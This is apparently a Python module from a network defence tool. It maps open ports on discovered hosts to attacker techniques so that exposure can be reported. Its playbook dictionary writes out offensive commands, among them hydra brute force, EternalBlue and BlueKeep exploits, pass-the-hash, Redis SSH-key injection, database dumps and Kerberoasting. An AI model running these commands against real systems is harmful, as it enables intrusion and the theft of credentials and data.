"""
oracle/attacker_view.py
────────────────────────────
Attacker View — Service-to-Attack-Technique Mapper

For each open port/service on discovered hosts, shows exactly what
an attacker would try. No actual exploitation — just the playbook.
"""
from __future__ import annotations
import netifaces
from typing import Any
from loguru import logger
from chronicle import db

# ── Service Attack Playbook ──────────────────────────────────────────────
# Maps (service_name, port) tuples to what an attacker would attempt.
SERVICE_ATTACKS: dict[str | int, list[dict]] = {
    # ── Remote Access ──
    "ssh": [
        {"technique": "Brute Force",     "tool": "hydra -l root -P rockyou.txt ssh://<ip>",                         "detail": "Try common SSH credentials. Default passwords on IoT/network devices are extremely common."},
        {"technique": "Key Theft",       "tool": "find / -name 'id_rsa' 2>/dev/null; ssh -i key user@<ip>",        "detail": "If you find an SSH private key on a compromised host, use it to pivot here."},
        {"technique": "SSH Tunneling",   "tool": "ssh -L 8080:internal:80 user@<ip>",                              "detail": "Use this host as a jumpbox to reach internal resources not directly accessible."},
        {"technique": "Version Exploit", "tool": "searchsploit openssh <version>; msfconsole -q -x 'search openssh'","detail": "Check for known OpenSSH vulnerabilities (CVE-2024-6387 regreSSHion, CVE-2018-15473 user enum)."},
    ],
    "telnet": [
        {"technique": "Credential Sniffing", "tool": "tcpdump port 23 -X",                                         "detail": "Telnet is plaintext — any credentials you capture are readable immediately."},
        {"technique": "Default Credentials", "tool": "hydra -l admin -P default-passwords.txt telnet://<ip>",      "detail": "IoT devices and network hardware often ship with admin:admin or root:root."},
    ],
    "ftp": [
        {"technique": "Anonymous Login",  "tool": "ftp <ip> (user: anonymous, pass: anonymous)",                   "detail": "Check if anonymous FTP access is enabled — often left open on older systems."},
        {"technique": "Brute Force",      "tool": "hydra -l ftp -P rockyou.txt ftp://<ip>",                        "detail": "Try common FTP credentials."},
        {"technique": "File Exfiltration","tool": "wget -r ftp://user:pass@<ip>/",                                 "detail": "Download everything from writable FTP directories."},
    ],

    # ── Windows / SMB ──
    "smb": [
        {"technique": "EternalBlue",   "tool": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'", "detail": "If unpatched (MS17-010), this gives SYSTEM-level access. Check with `nmap --script smb-vuln-ms17-010`."},
        {"technique": "SMB Relay",     "tool": "impacket-smbrelayx -tf targets.txt -smb2support",                 "detail": "If SMB signing is disabled, relay captured NTLM hashes to authenticate as the user."},
        {"technique": "Null Session",  "tool": "enum4linux -a <ip>; smbclient -L //<ip> -N",                      "detail": "Null session enumeration reveals users, shares, OS info. Still works on older Windows."},
        {"technique": "Password Spray","tool": "crackmapexec smb <ip> -u users.txt -p passwords.txt",             "detail": "Spray common passwords across all discovered users. No lockout risk if done slowly."},
        {"technique": "Pass-the-Hash", "tool": "impacket-psexec -hashes <LM>:<NT> <domain>/<user>@<ip>",          "detail": "If you capture NTLM hashes, authenticate without knowing the plaintext password."},
    ],

    # ── RDP ──
    "rdp": [
        {"technique": "BlueKeep",      "tool": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce'", "detail": "CVE-2019-0708 — RCE on unpatched Windows 7/2008 R2 systems."},
        {"technique": "Brute Force",   "tool": "hydra -l administrator -P rockyou.txt rdp://<ip>",                "detail": "RDP brute force against the administrator account."},
        {"technique": "Session Hijack","tool": "tscon.exe <session_id> /dest:<your_session>",                     "detail": "If on the same host, hijack another user's RDP session to escalate privileges."},
        {"technique": "NLA Bypass",    "tool": "https://github.com/maaaaz/credssp",                               "detail": "Older Windows versions allow RDP without NLA — skip the auth layer entirely."},
    ],
    "winrm": [
        {"technique": "Pass-the-Hash", "tool": "crackmapexec winrm <ip> -u admin -H <hash>",                     "detail": "WinRM accepts NTLM hashes directly. One hash = remote PowerShell."},
        {"technique": "Credential Auth","tool": "evil-winrm -i <ip> -u admin -p password",                        "detail": "If you have valid domain credentials, get a PowerShell session."},
    ],

    # ── Web Services ──
    "http": [
        {"technique": "Directory Busting", "tool": "gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt", "detail": "Discover hidden admin panels, backup files, and exposed configs."},
        {"technique": "SQL Injection",     "tool": "sqlmap -u 'http://<ip>/page?id=1' --batch --dump",                     "detail": "Test login forms and parameters for SQL injection vulnerabilities."},
        {"technique": "XSS",              "tool": "dalfox url http://<ip>/search?q=test",                                  "detail": "Cross-Site Scripting — inject JavaScript to steal cookies or deface pages."},
        {"technique": "CMS Fingerprinting","tool": "whatweb <ip>; wpscan --url http://<ip>",                              "detail": "Identify CMS version (WordPress, Joomla, Drupal) and check for known plugin vulns."},
        {"technique": "Path Traversal",   "tool": "ffuf -u http://<ip>/FUZZ/../../../etc/passwd -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt", "detail": "Attempt directory traversal to read system files."},
    ],
    "https": [],  # Same as http — handled by service name normalisation

    # ── Databases ──
    "mysql": [
        {"technique": "Default Credentials","tool": "mysql -u root -h <ip> -p (try root:root, root:empty)",       "detail": "MySQL often has root with no password or weak default creds on dev/staging instances."},
        {"technique": "SQL Dump",           "tool": "mysqldump -u root -h <ip> --all-databases > dump.sql",       "detail": "Once authenticated, dump all databases including user tables with password hashes."},
        {"technique": "Data Exfiltration",  "tool": "mysql -u root -h <ip> -e 'SELECT * FROM users.credentials'", "detail": "Extract sensitive data directly from exposed database tables."},
    ],
    "postgresql": [
        {"technique": "Default Credentials","tool": "psql -h <ip> -U postgres (try postgres:postgres)",           "detail": "PostgreSQL default installs often have weak or no password for the postgres user."},
        {"technique": "File Read",          "tool": "SELECT pg_read_file('/etc/passwd');",                        "detail": "PostgreSQL can read arbitrary files from the filesystem if you have DB access."},
    ],
    "mongodb": [
        {"technique": "No Auth Required",   "tool": "mongosh <ip>:27017/admin",                                   "detail": "Older MongoDB instances have no authentication enabled by default. Full database access."},
        {"technique": "Data Dump",          "tool": "mongodump --host <ip> --out ./mongo_dump",                   "detail": "Dump all collections without any credentials."},
    ],
    "redis": [
        {"technique": "No Auth Required",   "tool": "redis-cli -h <ip> keys *",                                   "detail": "Redis without auth lets you read/write all keys. Can be used for SSH key injection."},
        {"technique": "SSH Key Injection",  "tool": "redis-cli -h <ip> set /root/.ssh/authorized_keys '<pubkey>'", "detail": "Write an SSH public key into the redis user's authorized_keys via filesystem injection."},
    ],

    # ── Directory Services ──
    "ldap": [
        {"technique": "Anonymous Bind",     "tool": "ldapsearch -x -h <ip> -b 'dc=domain,dc=com'",                "detail": "Anonymous LDAP binds reveal users, groups, computers, and often email addresses."},
        {"technique": "User Enumeration",   "tool": "ldapdomaindump -u 'domain\\\\user' -p 'pass' <ip>",          "detail": "Enumerate all domain users for password spraying attacks."},
        {"technique": "Kerberoasting Prep", "tool": "GetUserSPNs.py domain/user:password -dc-ip <ip> -request",   "detail": "Extract service account hashes for offline cracking."},
    ],

    # ── SNMP ──
    "snmp": [
        {"technique": "Community String Brute", "tool": "onesixtyone -c community.txt <ip>",                      "detail": "Brute force the SNMP community string (public/private are defaults)."},
        {"technique": "MIB Walk",               "tool": "snmpwalk -c public -v2c <ip>",                           "detail": "Enumerate system info, running processes, network interfaces, installed software."},
        {"technique": "Device Info Leak",        "tool": "snmp-check <ip> -c public",                             "detail": "Extract device make, model, firmware version — useful for finding known vulns."},
    ],

    # ── ICS / SCADA ──
    "modbus": [
        {"technique": "Read Coils/Registers", "tool": "modbus-cli <ip> coil-read 0 100",                          "detail": "Read arbitrary PLC coils and registers — potential to manipulate industrial processes."},
    ],
    "bacnet": [
        {"technique": "Device Discovery",     "tool": "bacpypes 192.168.1.1/24",                                 "detail": "Enumerate building management system devices (HVAC, lighting, access control)."},
    ],
}

# Service name aliases
SERVICE_ALIASES = {
    "http": "http", "https": "http", "apache": "http", "nginx": "http", "iis": "http",
    "mysql": "mysql", "mariadb": "mysql",
    "postgresql": "postgresql", "pgsql": "postgresql",
    "mongodb": "mongodb", "mongod": "mongodb",
    "ssh": "ssh", "sshd": "ssh",
    "smb": "smb", "microsoft-ds": "smb", "netbios-ssn": "smb",
    "rdp": "rdp", "ms-wbt-server": "rdp", "ms-rdp": "rdp",
    "ldap": "ldap",
    "snmp": "snmp",
    "ftp": "ftp",
    "redis": "redis",
    "winrm": "winrm",
    "telnet": "telnet",
    "modbus": "modbus",
}


# ── Host Type Detection Rules (mirrors iris/wired_scanner.py) ────────────
HOST_TYPE_RULES = {
    "web_server":  {80, 443, 8080, 8443, 3000, 5000},
    "database":    {3306, 5432, 27017, 6379, 1433, 1521, 5984},
    "file_share":  {445, 139, 21, 20, 2049},
    "email":       {25, 110, 143, 993, 995, 587},
    "iot_embedded":{161, 8443, 8883, 5353, 502},
}

# ── Expected Ports per Host Type ─────────────────────────────────────────
EXPECTED_PORTS = {
    "web_server":  {80, 443, 8080, 8443, 3000, 5000},
    "database":    {3306, 5432, 27017, 6379, 1433, 1521, 5984},
    "file_share":  {445, 139, 21, 20, 2049, 111},
    "email":       {25, 110, 143, 993, 995, 587, 465},
    "iot_embedded":{161, 8443, 8883, 5353, 502, 5683, 5684},
    "default":     set(),
}

# Ports that are common/admin and NOT anomalous regardless of host type
ALWAYS_EXPECTED = {22, 53, 123, 443, 80, 8080}


def classify_port_anomaly(host_types: list[str], port: int, service: str | None = None) -> dict:
    """Check if a port is expected or anomalous for a given host type."""
    if port in ALWAYS_EXPECTED:
        return {"anomalous": False, "reason": "common_service"}
    for ht in host_types:
        if ht in EXPECTED_PORTS and port in EXPECTED_PORTS[ht]:
            return {"anomalous": False, "reason": f"expected_for_{ht}"}
    return {"anomalous": True, "reason": "unexpected_service"}


async def get_anomalous_ports() -> list[dict]:
    """Get all hosts with anomalous ports (ports that don't match host type)."""
    results = []
    hosts = await db.fetch_all("SELECT id, ip, hostname, os_name FROM hosts WHERE is_active=1")
    for host in hosts:
        ports = await db.fetch_all("SELECT port, protocol, service, state FROM ports WHERE host_id=? AND state='open'", (host['id'],))
        # Get host types from stored host data or detect from ports
        open_ports = [p['port'] for p in ports]
        host_types = _detect_host_type_for_ports(open_ports)
        anomalous = []
        for p in ports:
            cls = classify_port_anomaly(host_types, p['port'], p['service'])
            if cls["anomalous"]:
                anomalous.append({"port": p['port'], "protocol": p['protocol'], "service": p['service'], "reason": cls["reason"]})
        if anomalous:
            results.append({"ip": host['ip'], "hostname": host['hostname'], "os": host['os_name'], "detected_type": host_types, "anomalous_ports": anomalous})
    return results


def _detect_host_type_for_ports(open_ports: list[int]) -> list[str]:
    """Replicate host type detection from port list (standalone version)."""
    port_set = set(open_ports)
    detected = []
    for htype, sig_ports in HOST_TYPE_RULES.items():
        if port_set & sig_ports:
            detected.append(htype)
    return detected or ["default"]


def get_attacks_for_service(service_name: str, port: int) -> list[dict]:
    """Return attack techniques for a given service/port combo."""
    svc = (service_name or "").lower().strip()
    # Try direct service name lookup
    if svc in SERVICE_ATTACKS:
        return SERVICE_ATTACKS[svc]
    # Try alias lookup
    alias = SERVICE_ALIASES.get(svc)
    if alias and alias in SERVICE_ATTACKS:
        return SERVICE_ATTACKS[alias]
    # Port-based fallback
    port_map = {
        22: "ssh", 23: "telnet", 21: "ftp",
        445: "smb", 139: "smb",
        3389: "rdp",
        80: "http", 443: "http", 8080: "http", 8443: "http",
        3306: "mysql", 5432: "postgresql", 27017: "mongodb", 6379: "redis",
        389: "ldap", 636: "ldap",
        161: "snmp", 162: "snmp",
        5985: "winrm", 5986: "winrm",
        502: "modbus",
    }
    mapped = port_map.get(port)
    if mapped and mapped in SERVICE_ATTACKS:
        return SERVICE_ATTACKS[mapped]
    return []


def _get_local_ips() -> set[str]:
    """Detect the host machine's own IPs from network interfaces."""
    local_ips = set()
    try:
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
            for addr in addrs:
                local_ips.add(addr['addr'])
    except Exception:
        pass
    return local_ips


async def generate_attacker_view() -> dict[str, Any]:
    """Generate a comprehensive attacker perspective with specific techniques."""
    local_ips = _get_local_ips()
    hosts = await db.fetch_all("""
        SELECT id, ip, hostname, os_name, risk_score, asset_value
        FROM hosts WHERE is_active=1 ORDER BY risk_score DESC
    """)

    # Ports considered admin/infrastructure (not attacker-facing on the host machine)
    ADMIN_PORTS = {8080, 8443, 9090, 3000, 5000, 2222}

    all_findings = []
    attack_counts = {"total_techniques": 0, "by_category": {}}

    for host in hosts:
        is_local_machine = host['ip'] in local_ips
        ports = await db.fetch_all("""
            SELECT port, protocol, service, version FROM ports
            WHERE host_id=? AND state='open'
        """, (host['id'],))

        host_attacks = []
        for p in ports:
            # Skip admin/infrastructure ports on the host machine (dashboard, monitoring)
            if is_local_machine and p['port'] in ADMIN_PORTS:
                continue
            techniques = get_attacks_for_service(p['service'], p['port'])
            for t in techniques:
                host_attacks.append({
                    "port": p['port'],
                    "protocol": p['protocol'],
                    "service": p['service'] or f"port-{p['port']}",
                    "technique": t["technique"],
                    "tool": t["tool"],
                    "detail": t["detail"],
                })
                attack_counts["total_techniques"] += 1
                cat = t["technique"].split(" ")[0]
                attack_counts["by_category"][cat] = attack_counts["by_category"].get(cat, 0) + 1

        if host_attacks:
            all_findings.append({
                "ip": host['ip'],
                "hostname": host['hostname'],
                "os": host['os_name'],
                "risk": host['risk_score'],
                "is_local_machine": is_local_machine,
                "attacks": host_attacks,
            })

    summary_lines = [
        f"From an attacker's perspective:",
        f"• {len(hosts)} discoverable hosts",
        f"• {attack_counts['total_techniques']} possible attack techniques identified",
    ]
    for cat, count in sorted(attack_counts["by_category"].items(), key=lambda x: -x[1])[:5]:
        summary_lines.append(f"  └ {cat}: {count} techniques")

    return {
        "findings": all_findings,
        "summary": "\n".join(summary_lines),
        "total_hosts": len(hosts),
        "total_techniques": attack_counts["total_techniques"],
    }